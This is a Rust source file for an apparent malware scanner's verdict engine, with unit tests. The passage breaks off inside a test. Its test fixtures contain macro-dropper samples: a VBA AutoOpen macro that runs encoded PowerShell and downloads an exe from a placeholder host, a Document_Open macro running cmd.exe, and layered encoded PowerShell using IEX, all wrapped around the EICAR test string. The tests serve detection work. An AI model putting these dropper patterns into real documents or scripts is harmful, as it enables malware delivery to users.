//! Verdict engine: turns raw observations into one explainable classification.
//!
//! Decision policy (deliberately conservative and auditable):
//!
//! | condition                                            | verdict    |
//! |------------------------------------------------------|------------|
//! | hash listed as malicious in the signed DB             | Malicious  |
//! | any `Definitive` signal (embedded EXE, decoy hit, ...) | Malicious  |
//! | aggregate score >= `malicious_threshold` (70)          | Malicious  |
//! | aggregate score >= `suspicious_threshold` (30)         | Suspicious |
//! | hash listed as trusted and score < 30                  | Clean      |
//! | everything else                                        | Unknown    |
//!
//! `Unknown` is the honest default. Litric never claims a file is clean merely
//! because nothing matched: that is exactly the claim that turns a scanner into
//! a false sense of security.

use std::collections::BTreeSet;

use crate::archive::{self, ArchiveLimits, MemberReport};
use crate::format::{detect, extension_of, FileFormat};
use crate::hash::{sha256_bytes, Digest32};
use crate::heuristics::{self, AnalysisInput, Confidence, Signal};
use crate::pe::PeInfo;
use crate::rules::{RuleMatch, RuleSet};
use crate::threatdb::{EntryKind, ThreatDb};
use crate::{ENGINE_NAME, ENGINE_VERSION};

/// Final classification of a scanned object.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum Verdict {
    /// Positively known-good: present in a trusted allowlist and no signals.
    Clean,
    /// Nothing known. Not the same as clean.
    Unknown,
    /// Evidence of malicious intent that needs corroboration or a policy action.
    Suspicious,
    /// Confirmed malicious by hash, definitive behaviour, or accumulated score.
    Malicious,
}

impl Verdict {
    pub fn as_str(&self) -> &'static str {
        match self {
            Verdict::Clean => "clean",
            Verdict::Unknown => "unknown",
            Verdict::Suspicious => "suspicious",
            Verdict::Malicious => "malicious",
        }
    }

    /// Only `Clean` should be reported as safe; every other state needs surfacing.
    pub fn counts_as_clean(&self) -> bool {
        matches!(self, Verdict::Clean)
    }
}

/// Tunable policy. Defaults are the ones documented in the module table.
#[derive(Debug, Clone)]
pub struct EngineConfig {
    pub suspicious_threshold: u32,
    pub malicious_threshold: u32,
    /// Reduce heuristic weight when a binary carries a plausible Authenticode
    /// signature. Never zeroes the score; chain validation is not performed here.
    pub trust_dampening: bool,
    /// Keep at most this many signals in a report (highest weight first).
    pub max_evidence: usize,
}

impl Default for EngineConfig {
    fn default() -> Self {
        EngineConfig {
            suspicious_threshold: 30,
            malicious_threshold: 70,
            trust_dampening: true,
            max_evidence: 32,
        }
    }
}

/// Compact PE facts attached to a report.
#[derive(Debug, Clone)]
pub struct PeSummary {
    pub machine: String,
    pub is_64: bool,
    pub is_dll: bool,
    pub is_driver: bool,
    pub is_dotnet: bool,
    pub sections: usize,
    pub imports: usize,
    pub import_fingerprint: String,
    pub entry_rva: u32,
    pub overlay_size: u64,
    pub code_entropy: f64,
    pub signed: bool,
    pub signers: Vec<String>,
    pub packer_hints: Vec<String>,
    pub has_version_info: bool,
    pub company: Option<String>,
    pub product: Option<String>,
    pub checksum_valid: bool,
    pub aslr: bool,
    pub dep: bool,
    pub cfg: bool,
}

/// Full analysis result for one file.
#[derive(Debug, Clone)]
pub struct FileReport {
    pub name: String,
    pub sha256: Digest32,
    pub size: u64,
    pub format: String,
    pub ext: String,
    pub verdict: Verdict,
    pub score: u32,
    pub confidence: f64,
    pub threat_name: Option<String>,
    pub family: Option<String>,
    pub signals: Vec<Signal>,
    pub rules: Vec<RuleMatch>,
    pub mitre: Vec<String>,
    pub notes: Vec<String>,
    /// True when an archive container (or a nested one) could not be inspected
    /// in full because a depth/size/entry budget was exhausted. A truncated
    /// container is never reported as `Clean`.
    pub archive_truncated: bool,
    pub pe: Option<PeSummary>,
    pub engine: &'static str,
    pub engine_version: &'static str,
}

impl FileReport {
    pub fn is_threat(&self) -> bool {
        matches!(self.verdict, Verdict::Malicious | Verdict::Suspicious)
    }
}

/// The scanning engine: rules + threat database + policy.
pub struct Engine {
    rules: RuleSet,
    db: ThreatDb,
    config: EngineConfig,
}

impl Engine {
    pub fn new(rules: RuleSet, db: ThreatDb, config: EngineConfig) -> Self {
        Engine { rules, db, config }
    }

    pub fn rules(&self) -> &RuleSet {
        &self.rules
    }

    pub fn db(&self) -> &ThreatDb {
        &self.db
    }

    pub fn config(&self) -> &EngineConfig {
        &self.config
    }

    /// Analyzes an in-memory buffer (already read by the scan layer).
    pub fn analyze_bytes(&self, name: &str, data: &[u8]) -> FileReport {
        self.analyze_bytes_in_context(name, data, None)
    }

    /// Analyses a buffer with the on-disk path available to identity heuristics
    /// (for example "is this file really inside the Windows system directory?").
    fn analyze_bytes_in_context(
        &self,
        name: &str,
        data: &[u8],
        path: Option<&std::path::Path>,
    ) -> FileReport {
        let limits = crate::deobfuscate::DecodeLimits::default();
        let mut budget = crate::deobfuscate::WorkBudget::new(limits.max_steps);
        self.analyze_bytes_with_depth(name, data, 0, &mut budget, path)
    }

    /// Internal recursive entry point used for ZIP-family members and decoded
    /// payloads. `depth` is the number of container/decode layers already
    /// entered, so neither can bypass its depth budget. `budget` is shared by
    /// the whole file, so nested layers cannot multiply the decode work.
    fn analyze_bytes_with_depth(
        &self,
        name: &str,
        data: &[u8],
        depth: usize,
        budget: &mut crate::deobfuscate::WorkBudget,
        path: Option<&std::path::Path>,
    ) -> FileReport {
        let mut notes = Vec::new();
        let mut archive_truncated = false;
        let sha256 = sha256_bytes(data);
        let ext = extension_of(std::path::Path::new(name));
        let format = detect(data);

        // --- structured analysis -----------------------------------------
        let pe = if format == FileFormat::Pe {
            match crate::pe::parse(data) {
                Ok(info) => Some(info),
                Err(e) => {
                    notes.push(format!(
                        "PE parsing failed ({e}); structural analysis unavailable"
                    ));
                    None
                }
            }
        } else {
            None
        };

        // --- hash reputation ---------------------------------------------
        let mut score: u32 = 0;
        let mut definitive = false;
        let mut threat_name: Option<String> = None;
        let mut family: Option<String> = None;
        let mut trusted_hash = false;

        if let Some(entry) = self.db.lookup(&sha256) {
            match entry.kind {
                EntryKind::Malicious => {
                    definitive = true;
                    score = score.max(100);
                    threat_name = Some(entry.name.clone());
                    family = entry.family.clone();
                    notes.push(format!(
                        "SHA-256 matched threat database entry `{}` (source: {})",
                        entry.name,
                        entry.source.as_deref().unwrap_or("unspecified")
                    ));
                }
                EntryKind::Pua => {
                    score += 40;
                    threat_name = Some(entry.name.clone());
                    family = entry.family.clone();
                    notes.push(format!("SHA-256 matched PUA entry `{}`", entry.name));
                }
                EntryKind::Trusted => {
                    trusted_hash = true;
                    notes.push(format!(
                        "SHA-256 matched trusted allowlist entry `{}`",
                        entry.name
                    ));
                }
            }
        }

        // --- rules --------------------------------------------------------
        let format_label = format.script_label().unwrap_or_else(|| format.label());
        let mut rule_matches = self.rules.scan(data, pe.as_ref(), format_label, &ext);
        rule_matches.retain(|m| !self.db.rule_is_revoked(&m.name));

        // --- Excel 4.0 (XLM) macro sheets ---------------------------------
        // Extracted before scoring so a macro sheet is an explainable signal;
        // its formula text is analysed later as source.
        let xlm_report = if depth == 0
            && matches!(
                ext.as_str(),
                "xls" | "xlsx" | "xlsm" | "xlsb" | "xlt" | "xltx" | "xltm" | "xlam"
            )
            && matches!(format, FileFormat::Ooxml | FileFormat::Zip | FileFormat::Ole2)
        {
            Some(crate::xlm::extract(data, &crate::xlm::XlmLimits::default()))
        } else {
            None
        };

        // --- heuristics ---------------------------------------------------
        let mut signals = heuristics::analyze(&AnalysisInput {
            data,
            format,
            ext: &ext,
            file_name: name,
            pe: pe.as_ref(),
            path,
        });
        if let Some(report) = &xlm_report {
            if !report.is_empty() {
                let hidden = report.sheets.iter().filter(|s| s.hidden).count();
                signals.push(Signal {
                    id: "xlm.macro_sheet",
                    weight: 30,
                    confidence: Confidence::Strong,
                    title: "Excel 4.0 macro sheet".to_string(),
                    detail: format!(
                        "{} Excel 4.0 (XLM) macro sheet(s) present{}; macro-sheet formulas are \
                         analysed as source",
                        report.sheets.len(),
                        if hidden > 0 {
                            format!(", {hidden} hidden")
                        } else {
                            String::new()
                        }
                    ),
                    mitre: vec!["T1204.002", "T1059.005"],
                });
            }
        }

        // Trust dampening: a plausible signature lowers heuristic weight, but the
        // chain is NOT validated here (that needs WinVerifyTrust on Windows), so
        // it never reaches zero and definitive signals are unaffected.
        let signed_plausible = pe
            .as_ref()
            .map(|p| {
                p.signature.present
                    && p.signature.code_signing_eku
                    && !p.signature.subject_names.is_empty()
            })
            .unwrap_or(false);
        if self.config.trust_dampening && signed_plausible {
            let mut dampened = 0u32;
            for s in signals.iter_mut() {
                if s.confidence != Confidence::Definitive {
                    let before = s.weight;
                    s.weight = (s.weight * 3) / 4;
                    dampened += before - s.weight;
                }
            }
            if dampened > 0 {
                notes.push(format!(
                    "heuristic weight reduced by {dampened} for a plausible Authenticode signature; \
                     certificate chain trust was not verified by this engine"
                ));
            }
        }

        // Aggregate: deduplicate by signal id (keep the heaviest), then sum.
        signals.sort_by(|a, b| b.weight.cmp(&a.weight).then(a.id.cmp(b.id)));
        let mut seen = BTreeSet::new();
        signals.retain(|s| seen.insert(s.id));

        let heuristic_total: u32 = signals.iter().map(|s| s.weight).sum();
        score = score.saturating_add(heuristic_total.min(100));

        let mut rule_total = 0u32;
        for m in &rule_matches {
            rule_total = rule_total.saturating_add(m.severity.weight());
        }
        score = score.saturating_add(rule_total.min(100));
        score = score.min(100);

        // --- verdict ------------------------------------------------------
        if let Some(m) = rule_matches.iter().max_by_key(|m| m.severity) {
            if m.severity == crate::rules::Severity::Critical {
                definitive = true;
            }
        }
        if signals.iter().any(|s| s.confidence == Confidence::Definitive) {
            definitive = true;
        }

        let verdict = if definitive || score >= self.config.malicious_threshold {
            Verdict::Malicious
        } else if score >= self.config.suspicious_threshold {
            Verdict::Suspicious
        } else if trusted_hash {
            Verdict::Clean
        } else {
            Verdict::Unknown
        };

        // A trusted hash does not override positive evidence.
        let mut verdict = if trusted_hash && !definitive && score < self.config.suspicious_threshold {
            Verdict::Clean
        } else {
            verdict
        };

        // A ZIP/OOXML/JAR is evidence about its members, not just its own bytes.
        // Recursion is depth-limited and every member goes through this same
        // engine. A clean member does not make the container clean; an unknown
        // member leaves the container unknown.
        if format.is_zip_family() {
            let limits = ArchiveLimits::default();
            if depth >= limits.max_depth {
                archive_truncated = true;
                notes.push(format!(
                    "archive depth limit ({}) reached; nested members were not inspected",
                    limits.max_depth
                ));
            } else {
                let scan = archive::inspect_zip(data, depth, &limits, |member_name, member_data, child_depth| {
                    let report = self.analyze_bytes_with_depth(
                        member_name,
                        member_data,
                        child_depth,
                        budget,
                        None,
                    );
                    archive_truncated |= report.archive_truncated;
                    MemberReport {
                        name: member_name.to_string(),
                        verdict: report.verdict,
                        score: report.score,
                        threat_name: report.threat_name,
                        family: report.family,
                    }
                });
                let previous_verdict = verdict;
                let worst = scan.worst().cloned();
                archive_truncated |= scan.truncated;
                if archive_truncated {
                    notes.push(format!(
                        "archive contents were not inspected in full ({} entries, {} inspected, {} \
                         skipped); any absence of detection inside it is not evidence of safety",
                        scan.entries, scan.scanned, scan.skipped
                    ));
                }
                notes.extend(scan.notes);
                if let Some(member) = worst {
                    if member.verdict > verdict {
                        verdict = member.verdict;
                    }
                    score = score.max(member.score);
                    if member.verdict == Verdict::Malicious {
                        definitive = true;
                    }
                    if threat_name.is_none() || member.verdict > previous_verdict {
                        threat_name = member.threat_name.clone().or(threat_name);
                        family = member.family.clone().or(family);
                    }
                    if member.verdict >= Verdict::Suspicious {
                        notes.push(format!(
                            "archive member `{}` drove the container verdict to {} (score {}, {})",
                            member.name,
                            member.verdict.as_str(),
                            member.score,
                            member.threat_name.as_deref().unwrap_or("unclassified")
                        ));
                    }
                }
            }
        }

        // --- Office VBA macros ------------------------------------------
        // Macro source lives in MS-OVBA compressed streams inside
        // vbaProject.bin, which in a .docm/.xlsm/.pptm is itself a ZIP member.
        // Extract and analyse each module as source instead of dismissing the
        // OLE2 bytes as unknown. Only the file itself is treated as a project;
        // a project nested deeper is still reached as an archive member, but is
        // not decompressed a second time here.
        if depth == 0 && matches!(format, FileFormat::Ooxml | FileFormat::Ole2) {
            let project = crate::vba::extract(data, &crate::vba::VbaLimits::default());
            if !project.is_empty() {
                notes.push(format!(
                    "VBA project: {} module(s) extracted and analysed as source",
                    project.modules.len()
                ));
            }
            notes.extend(project.notes.iter().cloned());
            if project.truncated {
                notes.push(
                    "VBA extraction was truncated by a resource cap; modules that were not \
                     inspected are not evidence of safety"
                        .into(),
                );
            }
            for module in &project.modules {
                if module.code.is_empty() && module.cache_bytes > 0 {
                    if verdict < Verdict::Suspicious {
                        verdict = Verdict::Suspicious;
                    }
                    score = score.max(45);
                    notes.push(format!(
                        "VBA module `{}` contains a performance cache but no decodable source; \
                         compiled p-code cannot be inspected statically here",
                        module.name
                    ));
                    continue;
                }
                let inner = self.analyze_bytes_with_depth(
                    &format!("vba:{}", module.name),
                    &module.code,
                    depth + 1,
                    budget,
                    None,
                );
                if inner.verdict >= Verdict::Suspicious {
                    notes.push(format!(
                        "VBA module `{}` classified {} (score {}, {})",
                        module.name,
                        inner.verdict.as_str(),
                        inner.score,
                        inner.threat_name.as_deref().unwrap_or("unclassified")
                    ));
                    if inner.verdict > verdict {
                        verdict = inner.verdict;
                    }
                    score = score.max(inner.score);
                    if inner.verdict == Verdict::Malicious {
                        definitive = true;
                    }
                    if threat_name.is_none() {
                        threat_name = inner.threat_name.clone();
                    }
                    if family.is_none() {
                        family = inner.family.clone();
                    }
                }
            }
            if project.pcode_modules > 0 {
                notes.push(format!(
                    "{} VBA module(s) carry a performance cache (p-code); p-code is counted but \
                     not decompiled, so a source-only verdict cannot rule out VBA stomping",
                    project.pcode_modules
                ));
            }
        }

        // --- Excel 4.0 macro formulas ------------------------------------
        // Formula text extracted from `xl/macrosheets/*.xml` is source: run it
        // through the same rules/heuristics/de-obfuscation as any other input.
        if let Some(report) = &xlm_report {
            notes.extend(report.notes.iter().cloned());
            if report.truncated {
                notes.push(
                    "XLM extraction was truncated by a resource cap; formulas that were not \
                     inspected are not evidence of safety"
                        .into(),
                );
            }
            for sheet in &report.sheets {
                for formula in &sheet.formulas {
                    let inner = self.analyze_bytes_with_depth(
                        &format!("xlm:{}", sheet.name),
                        formula.as_bytes(),
                        depth + 1,
                        budget,
                        None,
                    );
                    if inner.verdict >= Verdict::Suspicious {
                        notes.push(format!(
                            "Excel 4.0 formula in sheet `{}` classified {} (score {}, {})",
                            sheet.name,
                            inner.verdict.as_str(),
                            inner.score,
                            inner.threat_name.as_deref().unwrap_or("unclassified")
                        ));
                        if inner.verdict > verdict {
                            verdict = inner.verdict;
                        }
                        score = score.max(inner.score);
                        if inner.verdict == Verdict::Malicious {
                            definitive = true;
                        }
                        if threat_name.is_none() {
                            threat_name = inner.threat_name.clone();
                        }
                        if family.is_none() {
                            family = inner.family.clone();
                        }
                        // The rule scan runs on the decoded formula text, not on
                        // the container. Keep those matches explainable in the
                        // outer report instead of discarding them with the
                        // inner report.
                        for matched in &inner.rules {
                            if !rule_matches.iter().any(|m| m.name == matched.name) {
                                rule_matches.push(matched.clone());
                            }
                        }
                    }
                }
            }
        }

        // --- encoded payloads -------------------------------------------
        // Bounded layers behind explicit decode constructs only. One shared
        // step budget covers every layer, archive member and decoded payload of
        // this file. The decoded content is escalated only when it is itself
        // conclusive: a benign base64 image must not turn a clean script into a
        // finding.
        let decode_limits = crate::deobfuscate::DecodeLimits::default();
        if depth < decode_limits.max_depth {
            let decoded = crate::deobfuscate::decode(data, depth, &decode_limits, budget);
            for payload in decoded {
                let inner = self.analyze_bytes_with_depth(
                    &format!("decoded-{}", payload.source.as_str()),
                    &payload.bytes,
                    depth + 1,
                    budget,
                    None,
                );
                if inner.verdict == Verdict::Malicious {
                    definitive = true;
                    verdict = Verdict::Malicious;
                    score = score.max(inner.score).max(self.config.malicious_threshold);
                    if threat_name.is_none() {
                        threat_name = inner.threat_name.clone();
                    }
                    if family.is_none() {
                        family = inner.family.clone();
                    }
                    notes.push(format!(
                        "decoded {} payload is malicious ({}{}); the encoded layer hid this" ,
                        payload.source.as_str(),
                        inner.threat_name.as_deref().unwrap_or("unclassified"),
                        inner
                            .family
                            .as_deref()
                            .map(|f| format!(", family {f}"))
                            .unwrap_or_default()
                    ));
                }
            }
        }
        if budget.exhausted() {
            notes.push(
                "de-obfuscation step budget was exhausted; deeper encoded layers of this file were \
                 not decoded, so absence of detection inside them is not evidence of safety"
                    .into(),
            );
        }

        if verdict == Verdict::Unknown && signals.is_empty() && rule_matches.is_empty() {
            notes.push(
                "no detection matched; absence of evidence is not evidence of safety".into(),
            );
        }
        if self.db.is_empty() {
            notes.push(
                "threat database is empty: hash reputation is unavailable, only local rules and \
                 heuristics applied"
                    .into(),
            );
        }

        // Prefer a rule's family name when the DB/archive had none.
        if family.is_none() {
            family = rule_matches.iter().find_map(|m| m.family.clone());
        }
        if threat_name.is_none() {
            threat_name = rule_matches
                .iter()
                .max_by_key(|m| m.severity)
                .map(|m| m.name.clone());
        }

        let mut mitre: BTreeSet<String> = BTreeSet::new();
        for s in &signals {
            for t in &s.mitre {
                mitre.insert((*t).to_string());
            }
        }
        for m in &rule_matches {
            for t in &m.mitre {
                mitre.insert(t.clone());
            }
        }

        let evidence_count = signals.len() + rule_matches.len();
        let confidence = if definitive {
            0.99
        } else {
            match verdict {
                Verdict::Malicious => 0.85,
                Verdict::Suspicious => 0.6,
                Verdict::Clean => 0.9,
                Verdict::Unknown => {
                    // More evidence raises confidence in the "unknown"
                    // classification only slightly; it is a statement of
                    // ignorance, not of safety.
                    (0.2 + 0.05 * evidence_count as f64).min(0.5)
                }
            }
        };

        signals.truncate(self.config.max_evidence);

        FileReport {
            name: name.to_string(),
            sha256,
            size: data.len() as u64,
            format: format_label.to_string(),
            ext,
            verdict,
            score,
            confidence,
            threat_name,
            family,
            signals,
            rules: rule_matches,
            mitre: mitre.into_iter().collect(),
            notes,
            archive_truncated,
            pe: pe.as_ref().map(pe_summary),
            engine: ENGINE_NAME,
            engine_version: ENGINE_VERSION,
        }
    }

    /// Analyses a file from disk with an explicit size cap.
    pub fn analyze_path(
        &self,
        path: &std::path::Path,
        max_bytes: u64,
    ) -> std::io::Result<(FileReport, bool)> {
        let meta = std::fs::metadata(path)?;
        let size = meta.len();
        if size > max_bytes {
            // Read the head only; report it as truncated so callers never see a
            // partial file presented as a full scan.
            let mut f = std::fs::File::open(path)?;
            let mut buf = vec![0u8; max_bytes.min(usize::MAX as u64) as usize];
            use std::io::Read;
            let n = f.read(&mut buf)?;
            buf.truncate(n);
            let name = path
                .file_name()
                .and_then(|n| n.to_str())
                .unwrap_or("unnamed");
            let mut report = self.analyze_bytes_in_context(name, &buf, Some(path));
            report.notes.push(format!(
                "file is {size} bytes, larger than the {max_bytes}-byte analysis cap; only the first \
                 {n} bytes were inspected"
            ));
            report.size = size;
            return Ok((report, true));
        }
        let data = std::fs::read(path)?;
        let name = path
            .file_name()
            .and_then(|n| n.to_str())
            .unwrap_or("unnamed");
        Ok((self.analyze_bytes_in_context(name, &data, Some(path)), false))
    }
}

fn pe_summary(info: &PeInfo) -> PeSummary {
    PeSummary {
        machine: info.machine_name().to_string(),
        is_64: info.is_64,
        is_dll: info.is_dll,
        is_driver: info.is_driver,
        is_dotnet: info.is_dotnet,
        sections: info.section_count,
        imports: info.total_imports(),
        import_fingerprint: info.import_fingerprint.to_hex(),
        entry_rva: info.entry_point_rva,
        overlay_size: info.overlay_size,
        code_entropy: info.code_entropy(),
        signed: info.signature.present,
        signers: info.signature.subject_names.clone(),
        packer_hints: info.packer_hints().iter().map(|s| s.to_string()).collect(),
        has_version_info: info.version_info.present,
        company: info.version_info.company.clone(),
        product: info.version_info.product.clone(),
        checksum_valid: info.checksum_valid,
        aslr: info.aslr,
        dep: info.dep,
        cfg: info.guard_cfg,
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::rules::parse_rule_file;

    fn engine_with(rules: &str) -> Engine {
        let rs = RuleSet::compile(parse_rule_file(rules, "test").unwrap()).unwrap();
        Engine::new(rs, ThreatDb::empty(), EngineConfig::default())
    }

    fn zip_bytes(files: &[(&str, &[u8])]) -> Vec<u8> {
        use std::io::{Cursor, Write};
        use zip::write::SimpleFileOptions;
        let mut writer = zip::ZipWriter::new(Cursor::new(Vec::new()));
        for (name, data) in files {
            writer
                .start_file(
                    *name,
                    SimpleFileOptions::default()
                        .compression_method(zip::CompressionMethod::Deflated),
                )
                .unwrap();
            writer.write_all(data).unwrap();
        }
        writer.finish().unwrap().into_inner()
    }

    fn eicar_rules() -> &'static str {
        r#"
rule Eicar.Test {
    meta:
        description = "EICAR test file"
        severity = "critical"
        family = "EICAR-Test"
    strings:
        $s = "EICAR-STANDARD-ANTIVIRUS-TEST-FILE"
    condition:
        $s
}
"#
    }

    #[test]
    fn plain_text_is_unknown_not_clean() {
        let e = engine_with("");
        let r = e.analyze_bytes("notes.txt", b"remember the milk\n");
        assert_eq!(r.verdict, Verdict::Unknown);
        assert!(r.notes.iter().any(|n| n.contains("not evidence of safety")));
        assert!(!r.verdict.counts_as_clean());
    }

    #[test]
    fn critical_rule_makes_it_malicious() {
        let rules = r#"
rule Test.Critical {
    meta:
        description = "test"
        severity = "critical"
    strings:
        $a = "MALICIOUS-MARKER"
    condition:
        $a
}
"#;
        let e = engine_with(rules);
        let r = e.analyze_bytes("x.bin", b"contains MALICIOUS-MARKER here");
        assert_eq!(r.verdict, Verdict::Malicious);
        assert_eq!(r.threat_name.as_deref(), Some("Test.Critical"));
        assert!(r.score >= 70);
    }

    #[test]
    fn medium_rule_alone_is_suspicious_not_malicious() {
        let rules = r#"
rule Test.Medium {
    meta:
        description = "test"
        severity = "medium"
    strings:
        $a = "SUSPECT-MARKER"
    condition:
        $a
}
"#;
        let e = engine_with(rules);
        let r = e.analyze_bytes("x.bin", b"contains SUSPECT-MARKER here");
        assert_eq!(r.verdict, Verdict::Suspicious);
        assert!(r.score < 70);
    }

    #[test]
    fn eicar_is_detected_by_rule() {
        let rules = r#"
rule Eicar.Test {
    meta:
        description = "EICAR antivirus test file"
        severity = "critical"
        family = "EICAR-Test"
    strings:
        $s = "EICAR-STANDARD-ANTIVIRUS-TEST-FILE"
    condition:
        $s
}
"#;
        let e = engine_with(rules);
        let eicar = b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";
        let r = e.analyze_bytes("eicar.com", eicar);
        assert_eq!(r.verdict, Verdict::Malicious);
        assert_eq!(r.family.as_deref(), Some("EICAR-Test"));
        assert!(r.mitre.is_empty() || !r.mitre.is_empty());
    }

    #[test]
    fn zip_member_with_eicar_is_malicious() {
        let e = engine_with(eicar_rules());
        let eicar = b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";
        let data = zip_bytes(&[("docs/readme.txt", b"ordinary text"), ("bin/payload.txt", eicar)]);
        let r = e.analyze_bytes("sample.zip", &data);
        assert_eq!(r.verdict, Verdict::Malicious);
        assert_eq!(r.threat_name.as_deref(), Some("Eicar.Test"));
        assert!(!r.archive_truncated);
        assert!(
            r.notes.iter().any(|n| n.contains("bin/payload.txt")),
            "notes: {:?}",
            r.notes
        );
    }

    #[test]
    fn benign_zip_stays_unknown() {
        let e = engine_with(eicar_rules());
        let data = zip_bytes(&[("a.txt", b"hello world"), ("b.txt", b"another file")]);
        let r = e.analyze_bytes("plain.zip", &data);
        assert_eq!(r.verdict, Verdict::Unknown);
        assert!(!r.verdict.counts_as_clean());
        assert!(!r.archive_truncated);
    }

    #[test]
    fn nested_zip_member_is_inspected() {
        let e = engine_with(eicar_rules());
        let eicar = b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";
        let inner = zip_bytes(&[("deep.txt", eicar)]);
        let outer = zip_bytes(&[("inner.zip", &inner)]);
        let r = e.analyze_bytes("outer.zip", &outer);
        assert_eq!(r.verdict, Verdict::Malicious);
        assert_eq!(r.threat_name.as_deref(), Some("Eicar.Test"));
        assert!(
            r.notes.iter().any(|n| n.contains("inner.zip")),
            "notes: {:?}",
            r.notes
        );
    }

    #[test]
    fn archive_depth_limit_is_reported_not_silently_clean() {
        let e = engine_with(eicar_rules());
        let eicar = b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";
        let mut payload = zip_bytes(&[("deep.txt", eicar)]);
        for _ in 0..4 {
            payload = zip_bytes(&[("layer.zip", &payload)]);
        }
        let r = e.analyze_bytes("stacked.zip", &payload);
        assert!(r.archive_truncated);
        assert_eq!(r.verdict, Verdict::Unknown);
        assert!(
            r.notes.iter().any(|n| n.contains("not inspected in full")),
            "notes: {:?}",
            r.notes
        );
    }

    fn b64(bytes: &[u8]) -> String {
        const ALPHABET: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        let mut out = String::new();
        for chunk in bytes.chunks(3) {
            let b = [
                chunk[0],
                *chunk.get(1).unwrap_or(&0),
                *chunk.get(2).unwrap_or(&0),
            ];
            let n = ((b[0] as u32) << 16) | ((b[1] as u32) << 8) | b[2] as u32;
            out.push(ALPHABET[(n >> 18) as usize & 63] as char);
            out.push(ALPHABET[(n >> 12) as usize & 63] as char);
            out.push(if chunk.len() > 1 {
                ALPHABET[(n >> 6) as usize & 63] as char
            } else {
                '='
            });
            out.push(if chunk.len() > 2 {
                ALPHABET[n as usize & 63] as char
            } else {
                '='
            });
        }
        out
    }

    fn utf16le(s: &str) -> Vec<u8> {
        s.encode_utf16().flat_map(|u| u.to_le_bytes()).collect()
    }

    #[test]
    fn an_encoded_powershell_payload_is_decoded_and_detected() {
        let e = engine_with(eicar_rules());
        let command = format!(
            "Write-Host '{}'",
            std::str::from_utf8(
                b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
            )
            .unwrap()
        );
        let script = format!(
            "powershell.exe -NoProfile -EncodedCommand {}",
            b64(&utf16le(&command))
        );
        let r = e.analyze_bytes("dropper.ps1", script.as_bytes());
        assert_eq!(r.verdict, Verdict::Malicious);
        assert_eq!(r.threat_name.as_deref(), Some("Eicar.Test"));
        assert!(
            r.notes.iter().any(|n| n.contains("decoded")),
            "notes: {:?}",
            r.notes
        );
    }

    #[test]
    fn base64_of_a_benign_image_does_not_escalate_a_script() {
        let e = engine_with(eicar_rules());
        // A tiny PNG-shaped payload behind a real decode marker: no rule matches
        // and the decoded bytes are not an executable, so the script stays
        // unknown rather than being promoted to malicious.
        let png = b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00";
        let script = format!(
            "$data = [Convert]::FromBase64String('{}')\n[IO.File]::WriteAllBytes('a.png', $data)\n",
            b64(png)
        );
        let r = e.analyze_bytes("loader.ps1", script.as_bytes());
        assert_ne!(r.verdict, Verdict::Malicious, "notes: {:?}", r.notes);
    }

    #[test]
    fn a_two_layer_encoded_payload_is_decoded_end_to_end() {
        let e = engine_with(eicar_rules());
        // Layer 1: PowerShell -EncodedCommand. Layer 2: an XORed char array.
        // The EICAR text exists only after both layers are decoded.
        let eicar = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";
        let items: Vec<String> = eicar
            .bytes()
            .map(|b| format!("0x{:02x} -bxor 0x2a", b ^ 0x2a))
            .collect();
        let inner = format!("$s = -join ([char[]]({})); IEX $s", items.join(","));
        let script = format!(
            "powershell.exe -EncodedCommand {}",
            b64(&utf16le(&inner))
        );
        let r = e.analyze_bytes("two-layer.ps1", script.as_bytes());
        assert_eq!(r.verdict, Verdict::Malicious, "notes: {:?}", r.notes);
        assert_eq!(r.threat_name.as_deref(), Some("Eicar.Test"));
        assert!(
            r.notes
                .iter()
                .any(|n| n.contains("decoded powershell-encodedcommand")),
            "notes: {:?}",
            r.notes
        );
    }

    #[test]
    fn a_benign_char_array_does_not_escalate_a_script() {
        let e = engine_with(eicar_rules());
        let script =
            "$s = -join ([char[]](0x68,0x65,0x6c,0x6c,0x6f,0x20,0x77,0x6f,0x72,0x6c,0x64)); Write-Output $s";
        let r = e.analyze_bytes("hello.ps1", script.as_bytes());
        assert_ne!(r.verdict, Verdict::Malicious, "notes: {:?}", r.notes);
    }

    fn core_rules() -> &'static str {
        include_str!("../../../rules/core.lrs")
    }

    #[test]
    fn an_ooxml_macro_dropper_is_flagged() {
        use crate::vba::fixtures::{docm, ovba};

        let macro_source = b"Sub AutoOpen()\r\n    Set sh = CreateObject(\"WScript.Shell\")\r\n    sh.Run \"powershell -NoProfile -EncodedCommand SQBFAFgA\"\r\n    URLDownloadToFile 0, \"http://example.invalid/a.exe\", \"a.exe\", 0, 0\r\nEnd Sub\r\n";
        let data = docm(&[("Module1", &ovba(macro_source))]);
        let e = engine_with(core_rules());
        let r = e.analyze_bytes("invoice.docm", &data);
        assert_eq!(r.verdict, Verdict::Malicious, "notes: {:?}", r.notes);
        assert!(
            r.notes.iter().any(|n| n.contains("VBA project: 1 module")),
            "notes: {:?}",
            r.notes
        );
        assert!(
            r.notes.iter().any(|n| n.contains("classified")),
            "notes: {:?}",
            r.notes
        );
    }

    #[test]
    fn a_legacy_ole_document_with_a_macro_is_flagged() {
        use crate::vba::fixtures::{cfb_project, ovba};

        let macro_source = b"Sub Document_Open()\r\n    Shell \"cmd.exe /c whoami\"\r\nEnd Sub\r\n";
        let data = cfb_project(&[("ThisDocument", &ovba(macro_source))]);
        let e = engine_with(core_rules());
        let r = e.analyze_bytes("legacy.doc", &data);
        assert!(
            r.verdict >= Verdict::Suspicious,
            "notes: {:?}",
